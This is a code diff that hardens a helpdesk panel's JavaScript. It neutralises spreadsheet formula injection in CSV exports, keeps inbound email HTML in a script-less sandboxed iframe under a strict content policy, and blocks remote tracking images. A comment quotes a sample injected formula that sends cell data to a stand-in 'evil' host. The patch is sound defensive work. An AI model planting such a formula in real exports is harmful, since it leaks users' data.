@@ -898,8 +898,17 @@ function downloadCsv() {
     t.workedHours ?? "",
     t.createdAt,
   ]);
+  // Ticket fields come from inbound email. A sender name like
+  // =HYPERLINK("http://evil/?d="&A1,"Ver") would execute when the export is
+  // opened in Excel, so anything Excel treats as a formula gets a leading
+  // apostrophe. Quoting alone does not prevent this.
+  const csvCell = (value) => {
+    let text = String(value ?? "");
+    if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;
+    return `"${text.replace(/"/g, '""')}"`;
+  };
   const csv = [headers, ...rows]
-    .map((row) => row.map((cell) => `"${String(cell || "").replace(/"/g, '""')}"`).join(","))
+    .map((row) => row.map(csvCell).join(","))
     .join("\n");
 
   const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
@@ -1261,19 +1270,46 @@ document.addEventListener("click", (e) => {
   if (ticket) openEditModal(ticket);
 });
 
-function renderTicketBody(container, ticket) {
+// Renders the original HTML of an inbound email.
+//
+// ⚠️ The sandbox attribute must NEVER gain `allow-scripts`. Combined with the
+// `allow-same-origin` this frame needs to measure its own height, that pair
+// would give any email sender full script access to the panel's DOM and
+// session. Without `allow-scripts`, scripts in the email cannot run at all.
+//
+// Remote images start blocked: a `<img src="https://tracker/?id=X">` in an
+// email would otherwise report back the moment an agent opens the ticket,
+// leaking their IP and reading time. The agent can reveal them per ticket.
+function renderTicketBody(container, ticket, { showRemoteImages = false } = {}) {
   container.innerHTML = "";
   if (ticket.htmlBody) {
+    const hasRemoteImages = /<img[^>]+src\s*=\s*["']?https?:/i.test(ticket.htmlBody);
+
+    if (hasRemoteImages && !showRemoteImages) {
+      const bar = document.createElement("div");
+      bar.className = "remoteImageNotice";
+      bar.innerHTML =
+        '<span>Se bloquearon imágenes externas para proteger tu privacidad.</span>' +
+        '<button type="button" class="remoteImageBtn">Mostrar imágenes</button>';
+      bar.querySelector(".remoteImageBtn").addEventListener("click", () => {
+        renderTicketBody(container, ticket, { showRemoteImages: true });
+      });
+      container.appendChild(bar);
+    }
+
     const iframe = document.createElement("iframe");
     iframe.className = "emailHtmlFrame";
     iframe.setAttribute("sandbox", "allow-same-origin");
+    iframe.setAttribute("referrerpolicy", "no-referrer");
     iframe.setAttribute("title", "Contenido del correo");
     container.appendChild(iframe);
     // Write after appending so the document is accessible
     const doc = iframe.contentDocument || iframe.contentWindow.document;
+    const imgSrc = showRemoteImages ? "data: https:" : "data:";
     doc.open();
     doc.write(`<!DOCTYPE html><html><head>
 <meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src ${imgSrc}; style-src 'unsafe-inline'; font-src data:">
 <style>
   body { font-family: Arial, sans-serif; font-size: 14px; color: #222; margin: 12px; word-break: break-word; }
   img { max-width: 100%; height: auto; }
